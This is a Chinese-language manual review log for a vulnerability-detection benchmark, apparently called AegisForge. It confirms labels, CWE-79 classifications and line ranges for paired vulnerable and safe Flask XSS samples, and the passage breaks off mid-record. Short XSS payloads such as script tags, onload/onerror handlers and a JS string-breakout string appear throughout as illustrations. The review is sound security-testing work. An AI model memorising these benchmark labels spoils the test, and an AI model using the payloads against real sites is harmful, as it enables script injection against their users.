@@ -1,0 +1,5774 @@
+AegisForge 人工复核：样例复核记录
+
+复核说明
+- 复核人：visibywang；复核日期：2026-11-12；材料版本：69cf069。
+- 范围：现有 180 条检测样例逐条复核（120 条源码 + 60 条 HTTP），18 个动态修复样例另见《动态测试审查.txt》。
+- 结论口径：agree=同意原标签/类别/位置并给出理由；disagree=不同意并给出具体建议；
+  uncertain=现有材料不足。每条只取一个主审结论，不为了"通过"强行填写。
+- 行号口径：按单个样例计，分隔行不计，样例首个非空代码行为第 1 行；统计与 anchor 核对见
+  证据\02_源码行号与锚点核对.txt。所有摘录均为本人阅读源码/请求原文所得。
+- 独立性：先读源码和请求、自建数据流，再对照 manifest 的 label/cwe/lines/anchor；
+  没有使用任何模型报警结果反推标签。旧保留集已在 M6 调优中暴露（README.md 第 13、132 行），
+  本次只复核这 180 条，不把它重新表述为未暴露的独立测试集。
+- 交叉复核：本次只安排一人复核，未指定第二复核人，因此不填写他人姓名、不伪造交叉意见；
+  需要组长确认的分歧集中在《问题清单.txt》。
+- 数量：180 条检测样例中 agree 179、disagree 1、uncertain 0；18 条动态中 agree 15、
+  disagree 3、uncertain 0（合计 agree 194、disagree 4、uncertain 0）。
+
+====================================================================
+一、原保留集 XSS 源码（samples/holdout/source/xss.bundle.txt，12 族 24 条）
+====================================================================
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-09-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：ee11b47859c10c322f1602d7a298f099536b90f53cd647fed3776142088e67b6
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 8 行（anchor 位于第 8 行）
+
+主审结论：agree
+
+输入来源：GET /welcome 的查询参数 user，request.args.get("user", "")。
+输入经过的处理过程：直接作为 str.format 的参数填入 HTML 模板串，无赋值链以外的处理、无转义。
+最终输出位置或危险操作：第 8 行返回 "<p>Welcome back, {}.</p>".format(user)，Flask 以 text/html 输出。
+已有防护及其适用范围：无。str.format 不做 HTML 转义；视图返回 str 也不会再自动转义。
+
+判断理由：user 中的 <script>、<svg onload=...> 会原样出现在 text/html 响应中并被浏览器解析执行，
+是典型反射型 XSS。manifest 的 label=vulnerable、cwe=CWE-79、lines=[8,8]、anchor 与真实数据流一致。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 8 行
+证据文件：证据\03_源码关键片段.txt；证据\02_源码行号与锚点核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-09-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：7b61fbe1bb184e950c741566f0a8759358e30f4661d64db43f804a04f1d45261
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null（安全对照不声明漏洞位置）
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-09-V 的 GET /welcome 参数 user。
+输入经过的处理过程：第 9 行在格式化前调用 markupsafe.escape(user)，再交给 str.format。
+最终输出位置或危险操作：同一 HTML 文本节点（<p> 内），但参数已是实体编码后的文本。
+已有防护及其适用范围：markupsafe.escape 适用于 HTML 文本/属性值上下文；此处是文本节点，覆盖正确。
+
+判断理由：escape 把 &、<、>、引号编码为实体，浏览器只会当作文本显示；没有 Markup/|safe 等
+二次标记安全的操作，因此防护在本位置有效。原标签 safe 成立，且安全对照保留了同样的业务输出。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-10-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：1ecf355c7506844e206fe8805812f6bccf5e000d856cbecfb62d81a4dbbba101
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 8-10 行（anchor 位于第 8 行）
+
+主审结论：agree
+
+输入来源：GET /tags 的重复查询参数 tag（request.args.getlist("tag")）。
+输入经过的处理过程：列表推导式把每个 tag 直接拼成 "<li>" + tag + "</li>"，再用 join 合并为 body。
+最终输出位置或危险操作：第 10 行 Response(body, mimetype="text/html")，显式声明 HTML。
+已有防护及其适用范围：无。列表推导和 join 都不改变内容；Response 不会转义。
+
+判断理由：任一 tag 含 <img src=x onerror=...> 都会进入 HTML 列表并执行，属于反射型 XSS 的列表变体。
+manifest 的 lines=[8,10] 覆盖了拼接与响应两行，anchor "<li>" + tag 在区间内，标签与位置均合理。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 8-10 行（核心 sink 在第 8 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-10-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：f402e7dffa105db2eb7e14689e6a34c57565ba1bccd359cac99309bff4d24c1b
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-10-V 的 GET /tags 重复参数 tag。
+输入经过的处理过程：第 9 行对每个 tag 调用 escape(tag) 再转为 str 拼接。
+最终输出位置或危险操作：同一 text/html 列表响应，但每个单元格已是实体编码文本。
+已有防护及其适用范围：逐个元素的 HTML 文本转义，作用于列表的每一项，没有遗漏分支。
+
+判断理由：join 前每个元素都已转义，字符串拼接不会恢复标签；没有对 escape 结果再做 Markup。
+因此防护有效，原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-11-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：e14e3ea059c338ce379da514c3fd2b4c7c5c47fb8415ab00f12627eec2921b8e
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 8 行（anchor 位于第 8 行）
+
+主审结论：agree
+
+输入来源：Cookie theme，request.cookies.get("theme", "light")。
+输入经过的处理过程：直接拼进单引号 class 属性："<body class='" + theme + "'>Preferences</body>"。
+最终输出位置或危险操作：第 8 行返回 HTML，用户值位于单引号属性上下文。
+已有防护及其适用范围：无。拼接不转义，Cookie 值也不受浏览器端的编码限制（Werkzeug 解析后是原值）。
+
+判断理由：theme 含单引号即可闭合 class 属性并注入新属性或事件处理器；含 "><script> 可进一步注入标签。
+属性上下文里必须转义引号，原样例没有任何处理，属 XSS。label、CWE、lines=[8,8] 均成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 8 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-11-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：e4199208356606348450d5b9ee8d5c36b30d46aeb9fa331e09ba854a44bf686b
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-11-V 的 Cookie theme。
+输入经过的处理过程：第 9 行把 cookie 值交给 markupsafe.escape 后再拼进单引号属性。
+最终输出位置或危险操作：同一 class 属性文本，但引号、尖括号、& 均已编码。
+已有防护及其适用范围：escape 同时覆盖 HTML 文本与带引号属性值；本位置是单引号属性，覆盖正确。
+
+判断理由：escape 会把 ' 编码为 &#39;，攻击者无法闭合属性；没有 |safe/Markup 绕过。
+防护与属性上下文匹配，原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-12-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：697517988d89cc04dba423a5f09adf762983f00b83af36b09f2c8952653f7112
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 8-9 行（anchor 位于第 9 行）
+
+主审结论：agree
+
+输入来源：请求头 User-Agent，request.headers.get("User-Agent", "unknown")。
+输入经过的处理过程：赋值给 agent 后直接 f-string 插入 <pre> 文本节点。
+最终输出位置或危险操作：第 9 行返回 "<pre>Your browser: {agent}</pre>"，text/html。
+已有防护及其适用范围：无。f-string 不转义，请求头可由客户端任意设置。
+
+判断理由：User-Agent 中的 <script> 或 <img onerror> 会进入诊断页并执行，属反射型 XSS；
+pre 标签不改变 HTML 解析规则。lines=[8,9] 覆盖取值与输出，anchor 在第 9 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 8-9 行（sink 在第 9 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-12-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：835a7d8b9682f91d2461e01d4aa3584a4a2f4931c680f98abaaca158585d51ff
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-12-V 的 User-Agent。
+输入经过的处理过程：第 9 行读取 agent，第 10 行 escape(agent) 后 f-string 插值。
+最终输出位置或危险操作：同一 <pre> 文本节点，但内容已实体化。
+已有防护及其适用范围：escape 用于 HTML 文本上下文，且是唯一输出路径，覆盖完整。
+
+判断理由：请求头内容在进入 HTML 前被转义，浏览器不会解析为标签；无其他未转义输出。
+原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-13-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：efdcbad4fec7ef306506ed84b304747c6183fa6d225839ff5e7c62c9e324be05
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 9-11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：POST /api/coupons/redeem 的 JSON 字段 code。
+输入经过的处理过程：payload.get("code", "") → 若 code.isalnum() 为假，则把 code 原样插入
+"<h1>Invalid coupon</h1><p>{code} is not a valid code.</p>" 并返回 400；合法则返回 JSON。
+最终输出位置或危险操作：第 11 行 HTML 错误页（text/html, 400）。
+已有防护及其适用范围：仅有 isalnum 业务校验；它恰好只放行字母数字，攻击载荷走的是被拒绝分支，
+所以该校验反而保证了带标签的值进入 HTML，不构成本位置的输出编码。
+
+判断理由：XSS 载荷（含 <、>、引号）必然非 alnum，因此一定会进入错误页并被原样反射；
+400 响应同样会被浏览器渲染执行。属反射型 XSS，label/CWE/lines 与数据流一致。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 9-11 行（sink 在第 11 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无（该样例的漏洞只在错误分支，这与"分支内反射"一致，不影响标签）
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-13-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：6d0c6941c242cabba76c785e6888109dbca85c0b5ca9ab4102f3359537af62aa
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-13-V 的 JSON 字段 code。
+输入经过的处理过程：非 alnum 时返回 JSON 对象 {"error": ..., "code": code} 与 400，不再拼 HTML。
+最终输出位置或危险操作：JSON 响应体（application/json），不进入 HTML 解析上下文。
+已有防护及其适用范围：改用 JSON 输出，从上下文上消除了 HTML 注入；code 仍是原文，但不再是 HTML。
+
+判断理由：浏览器不会把 application/json 当 HTML 执行；即使客户端显示该字段，也需要客户端自行
+按 HTML 渲染才可能出问题，超出本服务端上下文。防护方式与位置匹配，原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-14-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：bb3fe1945d629462398b6fdd3c58a89a7b63c82efa3d05186e3830911abbe8b8
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 8-9 行（anchor 位于第 9 行）
+
+主审结论：agree
+
+输入来源：GET /search-widget 的查询参数 q。
+输入经过的处理过程：q 直接 % 格式化进单引号 JavaScript 字符串：
+<script>var initialQuery = '%s';</script>。
+最终输出位置或危险操作：第 9 行返回含内联脚本的 text/html。
+已有防护及其适用范围：无。HTML 实体转义只能防标签，防不了 JS 字符串闭合；本样例连转义都没有。
+
+判断理由：q="';alert(1)//" 可闭合 JS 字符串并执行脚本；q="</script><svg onload=...>" 可提前结束
+script 块。属性/文本转义都不适用于此上下文，必须按 JS 字符串规则编码（如 json.dumps）或整体
+避免内联脚本。原标签 vulnerable、CWE-79、lines=[8,9] 与数据流一致。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 8-9 行（sink 在第 9 行）
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-14-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：b1c779650f778dba9ab6ad30f3dd8af5db426fa9dbb8ed70177b8669b64782a9
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-14-V 的 GET /search-widget 参数 q。
+输入经过的处理过程：json.dumps(q) 生成带引号的 JSON 字符串，再把 "<" 替换为 \u003c，最后
+用 %s 放入脚本；不再手工包单引号。
+最终输出位置或危险操作：同一内联脚本位置，但值是完整的 JSON 字符串字面量。
+已有防护及其适用范围：JSON 编码负责引号/反斜杠/换行，<\u003c 负责阻止 </script> 提前闭合；
+适用于 JavaScript 字符串字面量这一具体上下文。
+
+判断理由：q 中的 '、"、\ 会被 json.dumps 转义，</script> 因 < 被替换而无法闭合脚本块；
+业务值仍能被 JS 原样读回（浏览器还原转义），所以既安全又不破坏功能。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：json.dumps 未处理 U+2028/U+2029；现代 ECMAScript 允许它们出现在字符串字面量中，
+不构成 HTML/JS 注入，仅作为实现细节记录。
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-15-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：e642b223b9e90eac45881bea94464220b8dc42d33fd463ebe0f190054e3106c0
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 4-9 行（anchor 位于第 4 行）
+
+主审结论：agree
+
+输入来源：GET /banner 的查询参数 message。
+输入经过的处理过程：常量模板 BANNER = "<div class='banner'>{{ message|safe }}</div>"；
+message 作为模板变量传入 render_template_string。
+最终输出位置或危险操作：第 9 行 render_template_string 渲染结果（text/html）。
+已有防护及其适用范围：Jinja 自动转义默认开启，但模板显式使用 |safe，等于在本位置关闭了自动转义；
+模板是常量，不存在服务端模板注入，问题就是 |safe 导致的 XSS。
+
+判断理由：message 原样进入 div 内容，<script>/<img onerror> 会被解析执行。|safe 是本位置的直接绕过，
+原标签 vulnerable、CWE-79、lines=[4,9]（模板 4、渲染 9）与数据流一致。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 4-9 行（关键在第 4 行的 |safe）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-15-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：4f9796ad0af2ee6d806652fb20a44371cc68ec7c4ef631d5b6696f9fcffcd124
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-15-V 的 GET /banner 参数 message。
+输入经过的处理过程：同样的常量模板，但去掉 |safe，使用 {{ message }}。
+最终输出位置或危险操作：render_template_string 的 HTML 文本节点。
+已有防护及其适用范围：Jinja 自动转义在文本节点生效，没有被 safe/Markup 关闭。
+
+判断理由：自动转义会把标签编码为实体；模板常量不含用户可控的模板语法，因此既无 XSS 也无 SSTI。
+原标签 safe 成立，业务输出保持不变。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-16-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：00c70c945d748f09b42d4a97f39f1145955cfeb8ee9db9d38fb82ef337fdcd3f
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 10-17 行（anchor 位于第 16 行）
+
+主审结论：agree
+
+输入来源：POST /rename 的表单字段 name。
+输入经过的处理过程：第 10 行以 HTML 拼接方式 flash("Project renamed to <b>" + name + "</b>")，
+消息存入 session；下一次 GET /projects 时 get_flashed_messages 取出，第 16 行
+Markup("<p class='flash'>%s</p>" % message) 直接把整段标记为安全，再拼进 main。
+最终输出位置或危险操作：第 16-17 行生成的 HTML（text/html）。
+已有防护及其适用范围：flash/get_flashed_messages 本身以文本方式保存，但第 16 行的 Markup 覆盖了
+自动转义；% 格式化在 str 上进行，先拼出原始 HTML 再整体标记安全，防护被完全绕过。
+
+判断理由：name 中的标签会先进入 session，再跨请求输出，属存储型（跨请求）XSS；Markup 是关键绕过点。
+lines=[10,17] 覆盖写入与输出，anchor 在 16 行，标签与位置合理。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 10-17 行（关键在第 16 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-16-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：d4a010869b37a0e66e00117ce9a7753b05942e4df1aefb2af355424f93170eb6
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-16-V 的表单字段 name。
+输入经过的处理过程：第 10 行 flash 纯文本 "Project renamed to " + name（不再拼 <b>）；
+第 16 行 Markup("<p class='flash'>{}</p>").format(message)。
+最终输出位置或危险操作：同一 <p class='flash'> 输出位置。
+已有防护及其适用范围：Markup.format 会对非 Markup 参数做 HTML 转义；message 是 flash 保存的
+文本（不是 Markup），因此转义生效。适用于 HTML 文本节点。
+
+判断理由：即使 name 含标签，flash 中保存的是纯文本，format 时被转义，输出只显示文本。
+没有其它未转义路径。原标签 safe 成立，业务文案仍保留。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-17-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：0889d2d8352e6feb62d4072b5b1e41a1c0b05081488a198a261988151a8e6791
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 6-8 行（anchor 位于第 8 行）
+
+主审结论：agree
+
+输入来源：路由变量 /u/<username>（Werkzeug 默认 string 转换器）。
+输入经过的处理过程：username 直接与 "<h2>Profile of " 和 "</h2>..." 字符串拼接。
+最终输出位置或危险操作：第 8 行返回 HTML 文本节点。
+已有防护及其适用范围：无。路由变量会做 URL 解码，标签和引号可以出现在路径段中。
+
+判断理由：/u/%3Csvg%20onload%3Dalert(1)%3E 解码后进入 <h2> 并执行，属反射型 XSS。
+lines=[6,8] 覆盖路由与输出，anchor 在第 8 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 6-8 行（sink 在第 8 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-17-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：134dc8bc11e83eeb9e22d8aaf664a6cf922a58057baae5c0c792f09a80e7a9cc
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-17-V 的路由变量 username。
+输入经过的处理过程：第 9 行 escape(username) 后与 HTML 文本拼接。
+最终输出位置或危险操作：同一 <h2> 文本节点。
+已有防护及其适用范围：HTML 文本转义，覆盖该位置；没有 Markup 绕过。
+
+判断理由：路径中的标签在进入 HTML 前被实体化，浏览器不会执行；原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-18-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：5bcbce1199ff2ec76ca66cd26ca4170db9bca73606df6b49998a38a6cccdb028
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 11-12 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：GET /card 的查询参数 title、summary。
+输入经过的处理过程：两个值放进 dict，交给 string.Template.substitute 替换 $title/$summary。
+最终输出位置或危险操作：第 12 行返回 CARD.substitute(values) 的 HTML。
+已有防护及其适用范围：无。string.Template 只做文本替换，不做 HTML 转义；也不是 Jinja 自动转义环境。
+
+判断理由：title/summary 中的标签会原样进入 div，浏览器解析执行；Template 的"安全"只在于 ${} 语法，
+与 HTML 上下文无关。lines=[11,12]、anchor 在 12 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 11-12 行（sink 在第 12 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-18-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：f65bb76476a0f759d9ea746887d14e0bb05088d4751c711d01254336bf3a0b94
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-18-V 的 GET /card 参数 title、summary。
+输入经过的处理过程：第 12 行对每个值 escape 后放入 dict，再交给 Template.substitute。
+最终输出位置或危险操作：同一卡片 HTML 文本节点。
+已有防护及其适用范围：escape 生成的 Markup 在 Template 替换时经 str() 变为实体文本，
+适用于 HTML 文本节点；两个字段都被覆盖。
+
+判断理由：substitute 只拼接字符串，不会取消实体编码；没有未转义字段。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-19-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：e8ac502c4eb81cc2c4da1e683e9b891c4c3b3f06c42a084bde64a42d4a9861e6
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 9-10 行（anchor 位于第 10 行）
+
+主审结论：agree
+
+输入来源：GET /find 的查询参数 term（MethodView.get）。
+输入经过的处理过程：term 赋值后直接 f-string 插入 <h1> 文本。
+最终输出位置或危险操作：第 10 行返回 HTML。
+已有防护及其适用范围：无。使用 MethodView 只改变注册方式，不改变输出编码。
+
+判断理由：term 中的 <script>/<svg onload> 原样进入 HTML 并执行；类方法不引入任何转义。
+lines=[9,10]、anchor 在 10 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 9-10 行（sink 在第 10 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-19-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：c75503e5f273dbf1104f7d5444cdfd992e910c616b6a4275040663ecbc669eda
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-19-V 的 GET /find 参数 term。
+输入经过的处理过程：第 11 行 escape(term) 后 f-string 插入 <h1>。
+最终输出位置或危险操作：同一文本节点，参数已实体化。
+已有防护及其适用范围：HTML 文本转义，MethodView 路径下同样生效。
+
+判断理由：escape 结果不会被执行；无 Markup 绕过。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-20-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：f7b877c9b51e121b9b45a41cceff38647b8655498c5b4f49bfffd67587809c32
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 20 行（anchor 位于第 20 行）
+
+主审结论：agree
+
+输入来源：POST /rsvp 的表单（request.form 的全部字段，模板使用 name、guests）。
+输入经过的处理过程：@require_form 装饰器只检查 request.form 非空，不做清洗；
+第 20 行直接用 % 字典格式化 "<p>%(name)s will attend with %(guests)s guests.</p>" % request.form。
+最终输出位置或危险操作：第 20 行返回的 HTML 文本节点。
+已有防护及其适用范围：无。装饰器只做存在性检查；% 字典格式化不转义值。
+
+判断理由：name 或 guests 中的标签会进入 HTML 并执行；request.form 是用户可控映射。
